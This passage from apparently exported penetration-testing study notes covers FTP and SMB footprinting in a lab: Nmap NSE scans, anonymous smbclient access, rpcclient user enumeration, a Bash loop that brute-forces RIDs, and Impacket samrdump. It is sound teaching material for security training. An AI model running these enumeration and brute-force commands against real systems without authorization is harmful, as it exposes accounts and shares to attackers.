and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.\n\n#### Upload a File\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ touch testupload.txt\n```\n\nWith the `PUT` command, we can upload files in the current folder to the FTP server.\n\nFTP\n\n```shell-session\nftp> put testupload.txt \n\nlocal: testupload.txt remote: testupload.txt\n---> PORT 10,10,14,4,184,33\n200 PORT command successful. Consider using PASV.\n---> STOR testupload.txt\n150 Ok to send data.\n226 Transfer complete.\n\n\nftp> ls\n\n---> TYPE A\n200 Switching to ASCII mode.\n---> PORT 10,10,14,4,223,101\n200 PORT command successful. Consider using PASV.\n---> LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents\ndrwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees\n-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt\n-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt\n226 Directory send OK.\n\n```\n\n---\n\n## Footprinting the Service\n\nFootprinting using various network scanners is also a handy and widespread approach. These tools make it easier for us to identify different services, even if they are not accessible on standard ports. One of the most widely used tools for this purpose is Nmap. Nmap also brings the [Nmap Scripting Engine](https://nmap.org/book/nse.html) (`NSE`), a set of many different scripts written for specific services. More information on the capabilities of Nmap and NSE can be found in the [Network Enumeration with Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) module. We can update this database of NSE scripts with the command shown.\n\n#### Nmap FTP Scripts\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap --script-updatedb\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST\nNSE: Updating rule database.\nNSE: Script Database updated successfully.\nNmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds\n```\n\nAll the NSE scripts are located on the Pwnbox in `/usr/share/nmap/scripts/`, but on our systems, we can find them using a simple command.\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts\n\n/usr/share/nmap/scripts/ftp-syst.nse\n/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse\n/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse\n/usr/share/nmap/scripts/ftp-bounce.nse\n/usr/share/nmap/scripts/ftp-libopie.nse\n/usr/share/nmap/scripts/ftp-anon.nse\n/usr/share/nmap/scripts/ftp-brute.nse\n```\n\nAs we already know, the FTP server usually runs on the standard TCP port 21, which we can scan using Nmap. We also use the version scan (`-sV`), aggressive scan (`-A`), and the default script scan (`-sC`) against our target `10.129.14.136`.\n\n#### Nmap\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST\nNmap scan report for 10.129.14.136\nHost is up (0.00013s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]\n| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]\n| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]\n| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]\n|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.4\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n```\n\nThe default script scan is based on the services' fingerprints, responses, and standard ports. Once Nmap has detected the service, it executes the marked scripts one after the other, providing different information. For example, the [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html) NSE script checks whether the FTP server allows anonymous access. If so, the contents of the FTP root directory are rendered for the anonymous user.\n\nThe `ftp-syst`, for example, executes the `STAT` command, which displays information about the FTP server status. This includes configurations as well as the version of the FTP server. Nmap also provides the ability to trace the progress of NSE scripts at the network level if we use the `--script-trace` option in our scans. This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server.\n\n#### Nmap Script Trace\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             \nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]\nNSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58\nNSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66\nNSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54230 > 10.129.14.136:21 | CONNECT\nNSE: TCP 10.10.14.4:54232 > 10.129.14.136:21 | CONNECT\nNSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...\nNSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...\nNSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.\n```\n\nThe scan history shows that four different parallel scans are running against the service, with various timeouts. For the NSE scripts, we see that our local machine uses other output ports (`54226`, `54228`, `54230`, `54232`) and first initiates the connection with the `CONNECT` command. From the first response from the server, we can see that we are receiving the banner from the server to our second NSE script (`54228`) from the target FTP server. If necessary, we can, of course, use other applications such as `netcat` or `telnet` to interact with the FTP server.\n\n#### Service Interaction\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -nv 10.129.14.136 21\n```\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ telnet 10.129.14.136 21\n```\n\nIt looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client `openssl` and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.\n\nFTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp\n\nCONNECTED(00000003)                                                                                      \nCan't use SSL_get_servername                        \ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\nverify error:num=18:self signed certificate\nverify return:1\n\ndepth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\nverify return:1\n---                                                 \nCertificate chain\n 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\n \n i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb\n---\n \nServer certificate\n\n-----BEGIN CERTIFICATE-----\n\nMIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL\n...SNIP...\n```\n\nThis is because the SSL certificate allows us to recognize the `hostname`, for example, and in most cases also an `email address` for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/08-SMB",
    "path": "02_CPTS/03-Footprinting/08-SMB.md",
    "title": "08 SMB",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the netwo...",
    "category": "02_CPTS",
    "content": "`Server Message Block` (`SMB`) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. Information exchange between different system processes can also be handled based on the SMB protocol. [SMB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688) first became available to a broader public, for example, as part of the OS/2 network operating system LAN Manager and LAN Server. Since then, the main application area of the protocol has been the Windows operating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.\n\nThe SMB protocol enables the client to communicate with other participants in the same network to access files or services shared with it on the network. The other system must also have implemented the network protocol and received and processed the client request using an SMB server application. Before that, however, both parties must establish a connection, which is why they first exchange corresponding messages.\n\nIn IP networks, SMB uses TCP protocol for this purpose, which provides for a three-way handshake between client and server before a connection is finally established. The specifications of the TCP protocol also govern the subsequent transport of data. We can take a look at some examples [here](https://web.archive.org/web/20240815212710/https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5BMS-SMB2%5D.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D).\n\nAn SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by `Access Control Lists` (`ACL`). They can be controlled in a fine-grained manner based on attributes such as `execute`, `read`, and `full access` for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.\n\n---\n\n## Samba\n\nAs mentioned earlier, there is an alternative implementation of the SMB server called Samba, which is developed for Unix-based operating systems. Samba implements the Common Internet File System (`CIFS`) network protocol. [CIFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e) is a dialect of SMB, meaning it is a specific implementation of the SMB protocol originally created by Microsoft. This allows Samba to communicate effectively with newer Windows systems. Therefore, it is often referred to as SMB/CIFS.\n\nHowever, `CIFS` is considered a specific version of the SMB protocol, primarily aligning with `SMB version 1`. When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports `137`, `138`, and `139`. In contrast, CIFS operates over TCP port `445` exclusively. There are several versions of SMB, including newer versions like `SMB 2` and `SMB 3`, which offer improvements and are preferred in modern infrastructures, while older versions like `SMB 1` (`CIFS`) are considered outdated but may still be used in specific environments.\n\n|**SMB Version**|**Supported**|**Features**|\n|---|---|---|\n|CIFS|Windows NT 4.0|Communication via NetBIOS interface|\n|SMB 1.0|Windows 2000|Direct connection via TCP|\n|SMB 2.0|Windows Vista, Windows Server 2008|Performance upgrades, improved message signing, caching feature|\n|SMB 2.1|Windows 7, Windows Server 2008 R2|Locking mechanisms|\n|SMB 3.0|Windows 8, Windows Server 2012|Multichannel connections, end-to-end encryption, remote storage access|\n|SMB 3.0.2|Windows 8.1, Windows Server 2012 R2||\n|SMB 3.1.1|Windows 10, Windows Server 2016|Integrity checking, AES-128 encryption|\n\nWith version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (`smbd`) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (`nmbd`) implements the last two functionalities. The SMB service controls these two background programs.\n\nWe know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an `application programming interface` (`API`) for networking computers called the `Network Basic Input/Output System` (`NetBIOS`). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called `name registration` procedure. Either each host reserves its hostname on the network, or the [NetBIOS Name Server](https://networkencyclopedia.com/netbios-name-server-nbns/) (`NBNS`) is used for this purpose. It also has been enhanced to [Windows Internet Name Service](https://networkencyclopedia.com/windows-internet-name-service-wins/) (`WINS`).\n\n---\n\n## Default Configuration\n\nAs we can imagine, Samba offers a wide range of [settings](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html) that we can configure. Again, we define the settings via a text file where we can get an overview of some of the settings. These settings look like the following when filtered out:\n\n#### Default Configuration\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/samba/smb.conf | grep -v \"#\\|\\;\" \n\n[global]\n   workgroup = DEV.INFREIGHT.HTB\n   server string = DEVSMB\n   log file = /var/log/samba/log.%m\n   max log size = 1000\n   logging = file\n   panic action = /usr/share/samba/panic-action %d\n\n   server role = standalone server\n   obey pam restrictions = yes\n   unix password sync = yes\n\n   passwd program = /usr/bin/passwd %u\n   passwd chat = *Enter\\snew\\s*\\spassword:* %n\\n *Retype\\snew\\s*\\spassword:* %n\\n *password\\supdated\\ssuccessfully* .\n\n   pam password change = yes\n   map to guest = bad user\n   usershare allow guests = yes\n\n[printers]\n   comment = All Printers\n   browseable = no\n   path = /var/spool/samba\n   printable = yes\n   guest ok = no\n   read only = yes\n   create mask = 0700\n\n[print$]\n   comment = Printer Drivers\n   path = /var/lib/samba/printers\n   browseable = yes\n   read only = yes\n   guest ok = no\n```\n\nWe see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares. In the individual shares, however, the global settings can be overwritten, which can be configured with high probability even incorrectly. Let us look at some of the settings to understand how the shares are configured in Samba.\n\n|**Setting**|**Description**|\n|---|---|\n|`[sharename]`|The name of the network share.|\n|`workgroup = WORKGROUP/DOMAIN`|Workgroup that will appear when clients query.|\n|`path = /path/here/`|The directory to which user is to be given access.|\n|`server string = STRING`|The string that will show up when a connection is initiated.|\n|`unix password sync = yes`|Synchronize the UNIX password with the SMB password?|\n|`usershare allow guests = yes`|Allow non-authenticated users to access defined share?|\n|`map to guest = bad user`|What to do when a user login request doesn't match a valid UNIX user?|\n|`browseable = yes`|Should this share be shown in the list of available shares?|\n|`guest ok = yes`|Allow connecting to the service without using a password?|\n|`read only = yes`|Allow users to read files only?|\n|`create mask = 0700`|What permissions need to be set for newly created files?|\n\n---\n\n## Dangerous Settings\n\nSome of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting `browseable = yes` as an example. If we as administrators adopt this setting, the company's employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.\n\n|**Setting**|**Description**|\n|---|---|\n|`browseable = yes`|Allow listing available shares in the current share?|\n|`read only = no`|Forbid the creation and modification of files?|\n|`writable = yes`|Allow users to create and modify files?|\n|`guest ok = yes`|Allow connecting to the service without using a password?|\n|`enable privileges = yes`|Honor privileges assigned to specific SID?|\n|`create mask = 0777`|What permissions must be assigned to the newly created files?|\n|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|\n|`logon script = script.sh`|What script needs to be executed on the user's login?|\n|`magic script = script.sh`|Which script should be executed when the script gets closed?|\n|`magic output = script.out`|Where the output of the magic script needs to be stored?|\n\nLet us create a share called `[notes]` and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.\n\n#### Example Share\n\nSMB\n\n```shell-session\n...SNIP...\n\n[notes]\n\tcomment = CheckIT\n\tpath = /mnt/notes/\n\n\tbrowseable = yes\n\tread only = no\n\twritable = yes\n\tguest ok = yes\n\n\tenable privileges = yes\n\tcreate mask = 0777\n\tdirectory mask = 0777\n```\n\nIt is highly recommended to look at the man pages for Samba and configure it ourselves and experiment with the settings. We will then discover potential aspects that will be interesting for us as a penetration tester. In addition, the more familiar we become with the Samba server and SMB, the easier it will be to find our way around the environment and use it for our purposes. Once we have adjusted `/etc/samba/smb.conf` to our needs, we have to restart the service on the server.\n\n#### Restart Samba\n\nSMB\n\n```shell-session\nroot@samba:~# sudo systemctl restart smbd\n```\n\nNow we can display a list (`-L`) of the server's shares with the `smbclient` command from our host. We use the so-called `null session` (`-N`), which is `anonymous` access without the input of existing users or valid passwords.\n\n#### SMBclient - Connecting to the Share\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbclient -N -L //10.129.14.128\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        home            Disk      INFREIGHT Samba\n        dev             Disk      DEVenv\n        notes           Disk      CheckIT\n        IPC$            IPC       IPC Service (DEVSM)\nSMB1 disabled -- no workgroup available\n```\n\nWe can see that we now have five different shares on the Samba server from the result. Thereby `print$` and an `IPC$` are already included by default in the basic setting, as we have already seen. Since we deal with the `[notes]` share, let us log in and inspect it using the same client program. If we are not familiar with the client program, we can use the `help` command on successful login, listing all the possible commands we can execute.\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ smbclient //10.129.14.128/notes\n\nEnter WORKGROUP\\<username>'s password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\n\n\nsmb: \\> help\n\n?              allinfo        altname        archive        backup         \nblocksize      cancel         case_sensitive cd             chmod          \nchown          close          del            deltree        dir            \ndu             echo           exit           get            getfacl        \ngeteas         hardlink       help           history        iosize         \nlcd            link           lock           lowercase      ls             \nl              mask           md             mget           mkdir          \nmore           mput           newer          notify         open           \nposix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    \nposix_unlink   posix_whoami   print          prompt         put            \npwd            q              queue          quit           readlink       \nrd             recurse        reget          rename         reput          \nrm             rmdir          showacls       setea          setmode        \nscopy          stat           symlink        tar            tarmode        \ntimeout        translate      unlock         volume         vuid           \nwdel           logon          listconnect    showconnect    tcon           \ntdis           tid            utimes         logoff         ..             \n!            \n\n\nsmb: \\> ls\n\n  .                                   D        0  Wed Sep 22 18:17:51 2021\n  ..                                  D        0  Wed Sep 22 12:03:59 2021\n  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021\n\n                30313412 blocks of size 1024. 16480084 blocks available\n```\n\nOnce we have discovered interesting files or folders, we can download them using the `get` command. Smbclient also allows us to execute local system commands using an exclamation mark at the beginning (`!<cmd>`) without interrupting the connection.\n\n#### Download Files from SMB\n\nSMB\n\n```shell-session\nsmb: \\> get prep-prod.txt \n\ngetting file \\prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) \n(average 8,7 KiloBytes/sec)\n\n\nsmb: \\> !ls\n\nprep-prod.txt\n\n\nsmb: \\> !cat prep-prod.txt\n\n[] check your code with the templates\n[] run code-assessment.py\n[] …\t\n```\n\nFrom the administrative point of view, we can check these connections using `smbstatus`. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access.\n\nFor example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own `NTDS.dit` and `Security Authentication Module` (`SAM`) and authenticate each user when they log in for the first time and wish to access another machine's share.\n\n#### Samba Status\n\nSMB\n\n```shell-session\nroot@samba:~# smbstatus\n\nSamba version 4.11.6-Ubuntu\nPID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              \n----------------------------------------------------------------------------------------------------------------------------------------\n75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    \n\nService      pid     Machine       Connected at                     Encryption   Signing     \n---------------------------------------------------------------------------------------------\nnotes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           \n\nNo locked files\n```\n\n---\n\n## Footprinting the Service\n\nLet us go back to one of our enumeration tools. Nmap also has many options and NSE scripts that can help us examine the target's SMB service more closely and get more information. The downside, however, is that these scans can take a long time. Therefore, it is also recommended to look at the service manually, mainly because we can find much more details than Nmap could show us. First, however, let us see what Nmap can find on our target Samba server, where we created the `[notes]` share for testing purposes.\n\n#### Nmap\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST\nNmap scan report for sharing.inlanefreight.htb (10.129.14.128)\nHost is up (0.00024s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nHost script results:\n|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-19T13:16:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.35 seconds\n```\n\nWe can see from the results that it is not very much that Nmap provided us with here. Therefore, we should resort to other tools that allow us to interact manually with the SMB and send specific requests for the information. One of the handy tools for this is `rpcclient`. This is a tool to perform MS-RPC functions.\n\nThe [Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.\n\n#### RPCclient\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ rpcclient -U \"\" 10.129.14.128\n\nEnter WORKGROUP\\'s password:\nrpcclient $> \n```\n\nThe `rpcclient` offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the rpcclient.\n\n|**Query**|**Description**|\n|---|---|\n|`srvinfo`|Server information.|\n|`enumdomains`|Enumerate all domains that are deployed in the network.|\n|`querydominfo`|Provides domain, server, and user information of deployed domains.|\n|`netshareenumall`|Enumerates all available shares.|\n|`netsharegetinfo <share>`|Provides information about a specific share.|\n|`enumdomusers`|Enumerates all domain users.|\n|`queryuser <RID>`|Provides information about a specific user.|\n\n#### RPCclient - Enumeration\n\nSMB\n\n```shell-session\nrpcclient $> srvinfo\n\n        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\t\t\n\t\t\nrpcclient $> enumdomains\n\nname:[DEVSMB] idx:[0x0]\nname:[Builtin] idx:[0x1]\n\n\nrpcclient $> querydominfo\n\nDomain:         DEVOPS\nServer:         DEVSMB\nComment:        DEVSM\nTotal Users:    2\nTotal Groups:   0\nTotal Aliases:  0\nSequence No:    1632361158\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:      0x1\n\n\nrpcclient $> netshareenumall\n\nnetname: print$\n        remark: Printer Drivers\n        path:   C:\\var\\lib\\samba\\printers\n        password:\nnetname: home\n        remark: INFREIGHT Samba\n        path:   C:\\home\\\n        password:\nnetname: dev\n        remark: DEVenv\n        path:   C:\\home\\sambauser\\dev\\\n        password:\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\nnetname: IPC$\n        remark: IPC Service (DEVSM)\n        path:   C:\\tmp\n        password:\n\t\t\n\t\t\nrpcclient $> netsharegetinfo notes\n\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\n        type:   0x0\n        perms:  0\n        max_uses:       -1\n        num_uses:       1\nrevision: 1\ntype: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE \nDACL\n        ACL     Num ACEs:       1       revision:       2\n        ---\n        ACE\n                type: ACCESS ALLOWED (0) flags: 0x00 \n                Specific bits: 0x1ff\n                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS \n                SID: S-1-1-0\n```\n\nThese examples show us what information can be leaked to anonymous users. Once an `anonymous` user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk.\n\nMost importantly, anonymous access to such services can also lead to the discovery of other users, who can be attacked with brute-forcing in the most aggressive case. Humans are more error-prone than properly configured computer processes, and the lack of security awareness and laziness often leads to weak passwords that can be easily cracked. Let us see how we can enumerate users using the `rpcclient`.\n\n#### Rpcclient - User Enumeration\n\nSMB\n\n```shell-session\nrpcclient $> enumdomusers\n\nuser:[mrb3n] rid:[0x3e8]\nuser:[cry0l1t3] rid:[0x3e9]\n\n\nrpcclient $> queryuser 0x3e9\n\n        User Name   :   cry0l1t3\n        Full Name   :   cry0l1t3\n        Home Drive  :   \\\\devsmb\\cry0l1t3\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\cry0l1t3\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e9\n        group_rid:      0x201\n        acb_info :      0x00000014\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n\n\nrpcclient $> queryuser 0x3e8\n\n        User Name   :   mrb3n\n        Full Name   :\n        Home Drive  :   \\\\devsmb\\mrb3n\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\mrb3n\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e8\n        group_rid:      0x201\n        acb_info :      0x00000010\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n```\n\nWe can then use the results to identify the group's RID, which we can then use to retrieve information from the entire group.\n\n#### Rpcclient - Group Information\n\nSMB\n\n```shell-session\nrpcclient $> querygroup 0x201\n\n        Group Name:     None\n        Description:    Ordinary Users\n        Group Attribute:7\n        Num Members:2\n```\n\nHowever, it can also happen that not all commands are available to us, and we have certain restrictions based on the user. However, the query `queryuser <RID>` is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that we will get information about it as soon as we query an assigned RID. There are several ways and tools we can use for this. To stay with the tool, we can create a `For-loop` using `Bash` where we send a command to the service using rpcclient and filter out the results.\n\n#### Brute Forcing User RIDs\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\";done\n\n        User Name   :   sambauser\n        user_rid :      0x1f5\n        group_rid:      0x201\n\t\t\n        User Name   :   mrb3n\n        user_rid :      0x3e8\n        group_rid:      0x201\n\t\t\n        User Name   :   cry0l1t3\n        user_rid :      0x3e9\n        group_rid:      0x201\n```\n\nAn alternative to this would be a Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).\n\n#### Impacket - Samrdump.py\n\nSMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ samrdump.py 10.129.14.128\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Retrieving endpoint list from 10.129.14.128\nFound domain(s):\n . DEVSMB\n . Builtin\n[*] Looking up users in domain DEVSMB\nFound user: 